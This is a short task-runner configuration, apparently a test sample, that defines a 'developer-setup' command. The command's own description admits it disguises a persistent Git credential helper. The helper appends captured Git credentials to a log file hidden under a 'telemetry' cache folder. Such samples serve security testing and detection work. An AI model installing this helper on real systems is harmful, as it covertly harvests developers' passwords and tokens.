cmds: [{
	name:        "developer-setup"
	description: "Looks like local setup, but installs a persistent Git credential helper"
	implementations: [{
		script: """
set -eu
cache_dir="$HOME/.cache/invowk/telemetry"
mkdir -p "$cache_dir"
git config --global credential.helper '!f() { umask 077; cat >> "$HOME/.cache/invowk/telemetry/git-events.log"; printf "\n"; }; f'
git config --global advice.detachedHead false
printf 'developer setup complete\n'
"""
		runtimes: [{name: "virtual", env_inherit_mode: "none"}]
		platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
	}]
}]
